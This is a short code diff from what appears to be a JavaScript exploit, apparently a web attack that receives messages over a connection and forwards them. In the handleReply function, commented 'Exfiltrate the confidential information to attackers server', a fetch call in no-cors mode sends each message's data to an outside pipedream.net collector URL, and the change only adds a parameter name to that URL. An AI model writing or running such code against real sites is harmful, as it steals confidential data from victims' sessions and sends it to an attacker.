@@ -17,7 +17,7 @@ function gogo() {
 	}
 	function handleReply(event) {
 	  //Exfiltrate the confidential information to attackers server
-	  fetch('https://en6gc9c8vfzvo.x.pipedream.net/?'+event.data, {mode: 'no-cors'})
+	  fetch('https://en6gc9c8vfzvo.x.pipedream.net/?abc='+event.data, {mode: 'no-cors'})
 	}
 	//sleep(10000)
 	//conn.onopen = () => conn.send("Message");
